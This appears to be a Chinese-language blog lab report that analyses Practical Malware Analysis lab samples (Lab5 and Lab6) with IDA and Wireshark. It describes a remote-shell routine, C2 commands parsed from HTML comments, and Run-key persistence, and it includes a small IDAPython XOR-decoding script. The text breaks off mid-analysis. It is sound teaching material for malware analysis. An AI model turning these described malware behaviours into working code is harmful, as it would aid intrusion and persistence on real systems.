<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110145549599.png" alt="image-20230110145549599"></p>
<p>可以看到，通过导入表中的 <code>API</code> 函数，推测该程序具有复制文件、读写文件功能。</p>
<p>根据下图中的导入表中的 <code>API</code> 函数，推测程序还有创造文件、创建进程等功能：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110145821406.png" alt="image-20230110145821406"></p>
<p>该程序的 <code>getSystemDirectoryA</code> 函数，可以用来获取系统目录：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110150013874.png" alt="image-20230110150013874"></p>
<p>在 <code>Advapi32.dll</code> 中存在关于注册表的操作、创建服务、删除服务等：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110150057214.png" alt="image-20230110150057214"></p>
<p>使用 <code>IDA</code> 查看程序的字符串：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110150333125.png" alt="image-20230110150333125"></p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110150442710.png" alt="image-20230110150442710"></p>
<p>发现了网址、系统根目录、系统函数、<code>cmd.exe</code>等。</p>
<p>双击运行该恶意代码时，程序会立即将自身删除，通过 <code>process monitor</code> 不难发现该程序打开了一个 <code>cmd.exe</code>：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110151222537.png" alt="image-20230110151222537"></p>
<p>因为文件会自动删除，所以无法进行更多有效的动态分析。</p>
<h2 id="四、Lab5-分析"><a href="#四、Lab5-分析" class="headerlink" title="四、Lab5 分析"></a>四、<code>Lab5</code> 分析</h2><p>对于该 <code>lab</code> 中的 <code>dll</code> 文件，我们使用 <code>IDA</code> 软件进行分析。</p>
<h3 id="4-1-分析-DNS-的内容"><a href="#4-1-分析-DNS-的内容" class="headerlink" title="4.1 分析 DNS 的内容"></a>4.1 分析 <code>DNS</code> 的内容</h3><p>我们寻找该 <code>dll</code> 文件的主函数 <code>DllMain</code>：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110195645879.png" alt="image-20230110195645879"></p>
<p>点击 <code>Imports</code>，进入导入函数窗口，按 <code>Ctrl+F</code> 按键搜索<code>gethostbyname</code>，获得地址 <code>100163CC</code>。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110200118220.png" alt="image-20230110200118220"></p>
<p>我们双击 <code>gethostbyname</code>，链接到该函数处，按 “<code>X</code>” 键，获得交叉引用次数。可以看到，除去重复的，由此可知有5个函数调用了它：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110200515254.png" alt="image-20230110200515254"></p>
<p>在汇编界面，按“<code>G</code>”，弹出地址跳转窗口，我们跳转到该地址：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110201130419.png" alt="image-20230110201130419"></p>
<p>直接看调用，我们发现使用了 <code>call</code> 函数调用，把栈顶的数据作为参数传给函数，往上看发现一个 <code>push</code> 命令，将 <code>eax</code> 值压入栈中。再观察 <code>eax</code> 值，往上是个 <code>add</code> 指令，加法指令，加上 <code>0D</code>，十进制为13。再往上看，发现一个 <code>mov</code> 指令，将 <code>off_10019040</code> 赋值给 <code>eax</code>，直接双击该参数，就跳转到了这个位置：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110201532450.png" alt="image-20230110201532450"></p>
<p>发现一个名为 <code>aThisIsRdoPicsP</code> 的变量。双击该变量，获取到字符串：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110201633446.png" alt="image-20230110201633446"></p>
<p>因此，可知 <code>DNS</code> 的内容就是 <code>pics.praticalmalwareanalysis.com</code>。</p>
<h3 id="4-2-分析引用-cmd-exe-代码区域"><a href="#4-2-分析引用-cmd-exe-代码区域" class="headerlink" title="4.2 分析引用 cmd.exe 代码区域"></a>4.2 分析引用 <code>cmd.exe</code> 代码区域</h3><p>在 <code>IDA View</code> 中找到该区域：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110202258350.png" alt="image-20230110202258350"></p>
<p>然后发现这个字符被压入了栈中：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110202346627.png" alt="image-20230110202346627"></p>
<p>我们分析这个函数的开头，会发现以下字符串 <code>&#39;Hi,Master [%d/%d/%d %d:%d:%d]</code>：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110205200581.png" alt="image-20230110205200581"></p>
<p>我们往下看，还看到了<code>This remote shell session</code>，可以分析出这是一个远程 <code>shell</code> 会话函数：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110205452093.png" alt="image-20230110205452093"></p>
<p>可知该区域的代码可以为攻击者开启一段远程 <code>shell</code> 会话。</p>
<h3 id="4-3-分析-PSLIST-导出函数"><a href="#4-3-分析-PSLIST-导出函数" class="headerlink" title="4.3 分析 PSLIST 导出函数"></a>4.3 分析 <code>PSLIST</code> 导出函数</h3><p>进入 <code>exports</code> 窗口，然后双击该函数，跳转到目的地，函数如下：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110214928100.png" alt="image-20230110214928100"></p>
<p>我们查看该函数的流程图：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110214959898.png" alt="image-20230110214959898" style="zoom:67%;" /></p>
<p>从流程图看有两个分支，然后有几处调用。该函数先把 <code>dword_1008E5BC</code> 变量置1，然后调用了 <code>sub_100036C3</code>，双击后，发现该函数获取了系统平台信息的详细版本信息，也即该部分的功能是对比是否是某一个操作系统。<code>dwPlatformId</code> 为2，平台为 <code>VER_PLATFORM_WIN32_NT</code>，具体系统如下所示：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110221131827.png" alt="image-20230110221131827"></p>
<p>函数如下所示：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110215221645.png" alt="image-20230110215221645"></p>
<p>之后出现了分支，<code>true</code> 是直接退出，所以看 <code>false</code> 分支：</p>
<p>再次出现两个分支，分别调用了 <code>sub_1000664C</code> 和 <code>sub_10006518</code>。分别查看这两个函数。查看 <code>sub_1000664C</code> 时，出现了“<code>CreateToolhelp32Snapshuot</code>”的字样，还有最多的字样是“<code>thread</code>”，说明该函数开启了一个进程（<code>openProcess</code>）：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110215529426.png" alt="image-20230110215529426"></p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110215640004.png" alt="image-20230110215640004"></p>
<p>我们发现了一个进程列表<code>ProcessID</code>，猜测该函数获取了系统的进程列表。<code>sub_10006518</code> 的内容和这个差不多，所以该函数可以获取一个进程列表信息。</p>
<p>综合以上分析，我们得到 <code>PSLIST</code> 导出函数的功能是查询所有进程，并将该进程列表通过网络发送出去，或者寻找某个特定进程并获取其信息。</p>
<h3 id="4-4-对-socket-的调用"><a href="#4-4-对-socket-的调用" class="headerlink" title="4.4 对 socket 的调用"></a>4.4 对 <code>socket</code> 的调用</h3><p>跳转到 <code>0x10001701</code>，发现存在对 <code>socket</code> 的调用：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110215921336.png" alt="image-20230110215921336"></p>
<p>总共向栈中压入了3个数值，分别是6，1，2，后面的注释里写了 <code>protocol</code>，<code>type</code> 和 <code>af</code>。经过查阅相应资料可知：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>type</th>
<th>protocol</th>
<th>af</th>
</tr>
</thead>
<tbody>
<tr>
<td>传输方式/套接字类型</td>
<td>传输所用的协议</td>
<td>地址族，也就是IP类型(IPv4/IPv6)</td>
</tr>
</tbody>
</table>
</div>
<p>查看 <code>Windows</code> 的手册，得知，<code>protocol</code> 的 <code>6</code> 代表 <code>IPPROTO_TCP</code>，也就是设置传输协议为 <code>TCP</code>：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/20210716155009864.png" alt="img"></p>
<p><code>type</code> 的 <code>1</code> 代表使用 <code>Internet</code> 地址系列，指要使用 <code>IP</code>进行通信：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/20210716155121441.png" alt="img"></p>
<p><code>af</code> 的 <code>2</code> 代表使用 <code>IPv4</code> 进行通信：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/20210716155349817.png" alt="img"></p>
<h3 id="4-5-导入Python脚本"><a href="#4-5-导入Python脚本" class="headerlink" title="4.5 导入Python脚本"></a>4.5 导入Python脚本</h3><p>我们运用下面的 <code>Python</code> 脚本：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">ea<span class="token operator">=</span>idc<span class="token punctuation">.</span>get_screen_ea<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    b<span class="token operator">=</span>idc<span class="token punctuation">.</span>get_wide_byte<span class="token punctuation">(</span>ea<span class="token operator">+</span>i<span class="token punctuation">)</span>
    d<span class="token operator">=</span>b<span class="token operator">^</span><span class="token number">0x55</span>
    ida_bytes<span class="token punctuation">.</span>patch_byte<span class="token punctuation">(</span>ea<span class="token operator">+</span>i<span class="token punctuation">,</span>d<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>该脚本的运行流程为：<code>get_screen_ea()</code> 函数获取 <code>IDA</code> 调试窗口中光标所指向代码的地址，然后在 <code>0x00</code> 到 <code>0x50</code> 间循环，逐字相加，再与 <code>0x55</code> 异或，最后将结果输出返回到 <code>IDA</code> 对应的地址中。</p>
<p>安装的 <code>IDA python</code> 插件，并导入该脚本：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110222859244.png" alt="image-20230110222859244"></p>
<p>可以发现，字符串发生变化：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110222829678.png" alt="image-20230110222829678"></p>
<p>然后在 <code>Hex view</code> 中查看，字符串已经正常显示：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110223010693.png" alt="image-20230110223010693"></p>
<h2 id="五、Lab6-分析"><a href="#五、Lab6-分析" class="headerlink" title="五、Lab6 分析"></a>五、<code>Lab6</code> 分析</h2><h3 id="5-1-Lab6-01分析"><a href="#5-1-Lab6-01分析" class="headerlink" title="5.1 Lab6-01分析"></a>5.1 <code>Lab6-01</code>分析</h3><h4 id="5-1-1-扫描实验文件"><a href="#5-1-1-扫描实验文件" class="headerlink" title="5.1.1 扫描实验文件"></a>5.1.1 扫描实验文件</h4><p>使用<a target="_blank" rel="noopener" href="https://www.virscan.org/">VirScan - 多引擎文件在线检测平台</a>扫描实验文件：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110223644676.png" alt="image-20230110223644676"></p>
<p>从扫描结果来看，可以确认该文件是病毒文件，但检出的引擎并不多。</p>
<h4 id="5-1-2-检查文件是否被加壳"><a href="#5-1-2-检查文件是否被加壳" class="headerlink" title="5.1.2 检查文件是否被加壳"></a>5.1.2 检查文件是否被加壳</h4><p>我们使用 <code>PEiD</code> 软件进行检查文件是否被加壳：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110224024775.png" alt="image-20230110224024775"></p>
<p>可以看到，该程序未加壳，是用 <code>Microsoft Visual C++ 6.0</code> 编写的。</p>
<h4 id="5-1-3-查看程序的导入表和字符串"><a href="#5-1-3-查看程序的导入表和字符串" class="headerlink" title="5.1.3 查看程序的导入表和字符串"></a>5.1.3 查看程序的导入表和字符串</h4><p>查看程序的导入表：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110224126597.png" alt="image-20230110224126597"></p>
<p>发现存在名为 <code>InternetGetConnectedState</code> 的 <code>API</code> 函数，其为可用网络连接的函数，推测可能有联网行为。</p>
<p>使用 <code>IDA</code> 软件查看程序的字符串，发现存在提示网络连接提示信息的字符串：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110224438277.png" alt="image-20230110224438277"></p>
<h4 id="5-1-4-程序分析"><a href="#5-1-4-程序分析" class="headerlink" title="5.1.4 程序分析"></a>5.1.4 程序分析</h4><p>回到 <code>main</code> 函数分析程序结构：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110224540457.png" alt="image-20230110224540457"></p>
<p>查看 <code>main</code> 的程序流程图：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110224627990.png" alt="image-20230110224627990"></p>
<p>我们分析 <code>sub_401000</code> 函数：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110224933295.png" alt="image-20230110224933295"></p>
<p>查看其函数流程图：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110225005973.png" alt="image-20230110225005973"></p>
<p>可以发现结构很简单，只存在两个函数调用，然后对第一个函数(<code>InternetGetConnectedState</code>)返回值进行判断，然后看关键 <code>push</code> 语句可以推测这是一个输出函数。</p>
<p>使用 <code>cmp</code> 对保存结果的 <code>eax</code> 寄存器与 <code>0</code> 比较，使用 <code>jz</code> 指令控制执行流。存在可用连接时， <code>InternetGetConnectedState</code>返回 <code>1</code>，否则返回 <code>0</code>；返回 <code>1</code> 时，零标志位（<code>ZF</code>）会被清除，<code>jz</code> 指令进入 <code>false</code> 分支。两个分支 <code>mov eax, 1</code>即为 <code>1</code>，连接成功；<code>xor eax, eax</code> 即为 <code>0</code>，连接失败。</p>
<p>综合以上分析，可以得到程序的功能是：检测本地能不能使用网路连接的程序，恶意代码可以用于检测本地的连接是否 <code>ok</code>，如果可以，程序会打印一个字符串，然后返回<code>1</code>；如果不行，那也是打印一个字符串，然后返回<code>0</code>。</p>
<p>我们运行一下程序验证上述分析结果：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110225509311.png" alt="image-20230110225509311"></p>
<p>断开网络，发现显示网络连接失败：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110225548596.png" alt="image-20230110225548596"></p>
<h3 id="5-2-Lab6-02分析"><a href="#5-2-Lab6-02分析" class="headerlink" title="5.2 Lab6-02分析"></a>5.2 <code>Lab6-02</code>分析</h3><h4 id="5-2-1-扫描实验文件"><a href="#5-2-1-扫描实验文件" class="headerlink" title="5.2.1 扫描实验文件"></a>5.2.1 扫描实验文件</h4><p>使用<a target="_blank" rel="noopener" href="https://www.virscan.org/">VirScan - 多引擎文件在线检测平台</a>扫描实验文件：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110223808233.png" alt="image-20230110223808233"></p>
<p>从扫描结果来看，可以确认该文件是病毒文件。</p>
<h4 id="5-2-2-检查文件是否被加壳"><a href="#5-2-2-检查文件是否被加壳" class="headerlink" title="5.2.2 检查文件是否被加壳"></a>5.2.2 检查文件是否被加壳</h4><p>我们使用 <code>PEiD</code> 软件进行检查文件是否被加壳：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110225903289.png" alt="image-20230110225903289"></p>
<p>可以看到，该程序未加壳，是用 <code>Microsoft Visual C++ 6.0</code> 编写的。</p>
<h4 id="5-2-3-查看程序的导入表和字符串"><a href="#5-2-3-查看程序的导入表和字符串" class="headerlink" title="5.2.3 查看程序的导入表和字符串"></a>5.2.3 查看程序的导入表和字符串</h4><p>查看程序的导入表：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110230241754.png" alt="image-20230110230241754"></p>
<p>我们发现，相比较上一个程序，多了几个函数都是网络相关，主要的功能是打开一个链接并且读取数据。</p>
<p>再使用 <code>IDA</code> 软件观察该程序的字符串：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110230439505.png" alt="image-20230110230439505"></p>
<p>我们发现和上个程序的字符串相类似，仅仅多了一个URL链接和一些提示信息。</p>
<h4 id="5-2-4-程序分析"><a href="#5-2-4-程序分析" class="headerlink" title="5.2.4 程序分析"></a>5.2.4 程序分析</h4><p>我们实际运行：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110232223588.png" alt="image-20230110232223588"></p>
<p>我然后在 <code>Win XP</code> 虚拟机中运行该程序，使用 <code>Wireshark</code> 监听流量。<code>Wireshark</code> 开启监听后，运行程序：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110233430340.png" alt="image-20230110233430340"></p>
<p>可以看到程序通过 <code>DNS</code> 请求查询恶意网址。</p>
<p>我的 <code>XP</code> 系统的 <code>Internet Explorer</code> 版本是<code>IE 6.0</code>：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110233945219.png" alt="image-20230110233945219"></p>
<p>进一步分析 <code>GET</code> 请求，可以发现，程序使用 <code>GET</code> 请求恶意网址时，该文件伪造了<code>user-agent</code>：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110233756356.png" alt="image-20230110233756356"></p>
<p>我们使用 <code>IDA</code> 软件进行程序的分析。回到 <code>main</code> 函数分析程序结构：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110230601325.png" alt="image-20230110230601325"></p>
<p>查看 <code>main</code> 函数的程序流程图：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110230711682.png" alt="image-20230110230711682"></p>
<p>我们先来看第一个函数：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110230958656.png" alt="image-20230110230958656"></p>
<p>我们发现了一个在上一小节中比较熟悉的函数 <code>InternetGetConnectedState</code>，基本可以断定它是在检查是否有可用网络。</p>
<p>往下分析，程序列举了一些情况：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110231558472.png" alt="image-20230110231558472"></p>
<p>我们接着看：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110231742429.png" alt="image-20230110231742429"></p>
<p>我们发现，程序中存在 <code>InternetExplorer7.5/pma</code> 作为 <code>http</code> 的 <code>user-agent</code>，程序还加载了 <a target="_blank" rel="noopener" href="http://www.practicalmalwareanalysis.com/cc.htm">http://www.practicalmalwareanalysis.com/cc.htm</a> 这个网页。</p>
<p>综合以上分析，程序首先判断是否存在一个可用的 <code>Internet</code> 连接，如果不存在就终止运行；否则，程序使用一个独特的用户代理尝试下载一个网页。该网页包含了一段由 <code>&lt;!–</code> 开始的 <code>HTML</code> 注释，程序解析其后的那个字符并输出到屏幕，输出格式是“<code>Success:ParsedcommandisX</code>“,其中 <code>X</code> 就是从该 <code>HTML</code> 注释中解析出来的字符。如果解析成功，程序会休眠1分钟，然后终止运行。</p>
<h3 id="5-3-Lab6-03分析"><a href="#5-3-Lab6-03分析" class="headerlink" title="5.3 Lab6-03分析"></a>5.3 <code>Lab6-03</code>分析</h3><h4 id="5-3-1-扫描实验文件"><a href="#5-3-1-扫描实验文件" class="headerlink" title="5.3.1 扫描实验文件"></a>5.3.1 扫描实验文件</h4><p>使用<a target="_blank" rel="noopener" href="https://www.virscan.org/">VirScan - 多引擎文件在线检测平台</a>扫描实验文件：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110223831536.png" alt="image-20230110223831536"></p>
<p>从扫描结果来看，可以确认该文件是病毒文件。</p>
<h4 id="5-3-2-检查文件是否被加壳"><a href="#5-3-2-检查文件是否被加壳" class="headerlink" title="5.3.2 检查文件是否被加壳"></a>5.3.2 检查文件是否被加壳</h4><p>我们使用 <code>PEiD</code> 软件进行检查文件是否被加壳：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110230045400.png" alt="image-20230110230045400"></p>
<p>可以看到，该程序未加壳，是用 <code>Microsoft Visual C++ 6.0</code> 编写的。</p>
<h4 id="5-2-3-查看程序的导入表和字符串-1"><a href="#5-2-3-查看程序的导入表和字符串-1" class="headerlink" title="5.2.3 查看程序的导入表和字符串"></a>5.2.3 查看程序的导入表和字符串</h4><p>查看程序的导入表：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110234459534.png" alt="image-20230110234459534"></p>
<p>和前面两个程序一样，同样发现了网络连接的 <code>API</code> 函数。</p>
<p>再使用 <code>IDA</code> 软件观察该程序的字符串：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111131245980.png" alt="image-20230111131245980"></p>
<p>我们发现和上个程序的字符串相类似，并增加了一些提示信息。另外，除在前面的程序中发现的一些字符串外，还有注册表键、文件路径等，且 <code>Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> 常用于恶意代码自启动。</p>
<p>另外，我们查看导入函数，发现存在对文件操作的函数和注册表函数：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111131626504.png" alt="image-20230111131626504"></p>
<p>另外，我们发现对网络操作的函数：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111131736869.png" alt="image-20230111131736869"></p>
<h4 id="5-3-4-程序分析"><a href="#5-3-4-程序分析" class="headerlink" title="5.3.4 程序分析"></a>5.3.4 程序分析</h4><p>我们使用 <code>IDA</code> 软件进行程序分析。我们先从 <code>main</code> 函数开始看：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111131844127.png" alt="image-20230111131844127"></p>
<p><code>sub_401000</code>（检查网络连接）和 <code>sub_401040</code>（下载网页并解析 <code>HTML</code> 注释）两个函数相同，<code>sub_401271</code>函数是<code>printf</code>，新函数是 <code>sub_401130</code>。</p>
<p>我们来看 <code>sub_401130</code> 函数：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111134114663.png" alt="image-20230111134114663"></p>
<p><code>arg_0</code> 是标准 <code>main</code> 函数参数的 <code>argv[0]</code>，<code>var_8</code> 由 <code>AL</code> 设置。<code>eax</code> 是上一个函数（<code>sub_401040</code> 用于下载 <code>HTML</code> 网页解析注释）调用的返回结果，而 <code>AL</code> 包含在 <code>eax</code> 中。因此，<code>var_8</code> 包含 <code>HTML</code> 注释中解析出的指令字符。</p>
<p>我们分析该函数的功能，大致有打印出错信息、删除一个文件、创建一个文件、设置一个注册表项值、复制一个文件、休眠100秒等。根据 <code>switch</code> 的判定条件：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111135729163.png" alt="image-20230111135729163"></p>
<p>a - <code>CreateDirectoryA</code>函数，判断文件路径是否存在”<code>C:\\Temp</code>“，不存在则创建它。</p>
<p>b - <code>CopyFileA</code>函数，两个参数：</p>
<ul>
<li>源文件：传递给当前函数的一个参数，当前程序名<code>（argv[0]）</code></li>
<li>目的文件：”<code>C:\\Temp\\cc.exe</code>“</li>
</ul>
<p>即是将<code>Lab06-03.exe</code>复制到 <code>C:\\Temp\\cc.exe</code>。</p>
<p>c - <code>DeleteFileA</code>函数，参数是 <code>C:\\Temp\\cc.exe</code>，即当该参数存在时，删除。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111140140065.png" alt="image-20230111140140065"></p>
<p>d - 在注册表中设置，以持久化运行。将<code>Software\Microsoft\Windows\CurrentVersion\Run\Malware</code>值设置为<code>C:\Temp\cc.exe</code>，实现跟随系统启动实现自启动。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111140317688.png" alt="image-20230111140317688"></p>
<p>e-<code>Sleep</code>休眠，<code>186A0h</code> 即 <code>100</code> 秒。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111140426401.png" alt="image-20230111140426401"></p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111140357336.png" alt="image-20230111140357336"></p>
<p>default选项：’<code>Error 3.2: Not a valid command provided</code>’</p>
<p>在 <code>XP</code> 虚拟机中实际运行：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111140831128.png" alt="image-20230111140831128"></p>
<p>综合以上分析，我们总结该恶意代码的功能：</p>
<p>首先检查是否存在网络连接。没有则终止，有则继续尝试下载网页，包含以<code>&lt;!--</code>开头的HTML注释，该注释的第一个字符用于 <code>switch</code> 语句决定程序在本地系统中的下一步行为，包括删除一个文件、创建一个文件、设置一个注册表项值、复制一个文件，或者休眠100秒。</p>
<h3 id="5-4-Lab6-04分析"><a href="#5-4-Lab6-04分析" class="headerlink" title="5.4 Lab6-04分析"></a>5.4 <code>Lab6-04</code>分析</h3><h4 id="5-4-1-扫描实验文件"><a href="#5-4-1-扫描实验文件" class="headerlink" title="5.4.1 扫描实验文件"></a>5.4.1 扫描实验文件</h4><p>使用<a target="_blank" rel="noopener" href="https://www.virscan.org/">VirScan - 多引擎文件在线检测平台</a>扫描实验文件：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110223846682.png" alt="image-20230110223846682"></p>
<p>从扫描结果来看，可以确认该文件是病毒文件。</p>
<h4 id="5-4-2-检查文件是否被加壳"><a href="#5-4-2-检查文件是否被加壳" class="headerlink" title="5.4.2 检查文件是否被加壳"></a>5.4.2 检查文件是否被加壳</h4><p>我们使用 <code>PEiD</code> 软件进行检查文件是否被加壳：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110230148377.png" alt="image-20230110230148377"></p>
<p>可以看到，该程序未加壳，是用 <code>Microsoft Visual C++ 6.0</code> 编写的。</p>
<h4 id="5-4-3-查看程序的导入表和字符串"><a href="#5-4-3-查看程序的导入表和字符串" class="headerlink" title="5.4.3 查看程序的导入表和字符串"></a>5.4.3 查看程序的导入表和字符串</h4><p>查看程序的导入表：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111141145976.png" alt="image-20230111141145976"></p>
<p>和前面三个程序一样，同样发现了网络连接的 <code>API</code> 函数。</p>
<p>再使用 <code>IDA</code> 软件观察该程序的字符串：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111141321949.png" alt="image-20230111141321949"></p>
<p>除了标记行会出现一个格式输出符 <code>%d</code> 外，与前面三个程序没有明显区别。</p>
<h4 id="5-4-4-程序分析"><a href="#5-4-4-程序分析" class="headerlink" title="5.4.4 程序分析"></a>5.4.4 程序分析</h4><p>我们使用 <code>IDA</code> 软件进行程序分析。我们先从 <code>main</code> 函数开始看：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111162315480.png" alt="image-20230111162315480"></p>
<p>可以看到，与前三个程序的程序结构都不太一样。</p>
<p>我们从开头开始分析。这里与前面类似，调用 <code>sub_401000</code>，<code>sub_401000</code> 返回的是此时网络连接的状态，如果是不可用的状态，就返回 <code>0</code> ，反之返回 <code>1</code>。然后下面比较返回值和 <code>0</code> 的关系，如果返回值不等于 <code>0</code>，则 <code>ZF=0</code>，然后 <code>jnz</code> 跳转；跳转之后就继续执行其他的函数，反之如果返回值等于 <code>0</code>，那程序就跳转结束了，并且返回 <code>0</code> 。如果连接可用的话，继续分析：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111163336686.png" alt="image-20230111163336686"></p>
<p>这里程序将一个值<code>0</code>赋给了<code>var_C</code>，然后无条件跳转到这里：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111163359502.png" alt="image-20230111163359502"></p>
<p>将<code>var_c</code>和<code>5A0h</code>比较，再根据比较结果跳转，<code>jge</code>是有符号大于跳转，现在<code>var_C</code>是<code>0</code>，所以这个跳转是不会实现的。当程序不跳转时：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111163501277.png" alt="image-20230111163501277"></p>
<p>函数不跳转之后，来到了这里，把<code>var_C</code>压入了栈中，然后调用了<code>sub_401040</code>这个函数</p>
<p>这个函数是调用<code>InternetOpenA</code>来初始话一个网络连接，然后调用<code>InternetReadFile</code>来从网络获取文件，最后比较获得文件的头四个数是不是 <code>&lt;!--</code>，最后返回第五个字符。</p>
<p>其实我们发现，该程序的结构其实是个<code>for</code>循环：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111164026228.png" alt="image-20230111164026228"></p>
<p>在程序中，解析 <code>HTML</code> 时，会调用<code>sprintf</code>函数来对输出进行格式化，也即改变 <code>User-Agent</code> 的值：</p>
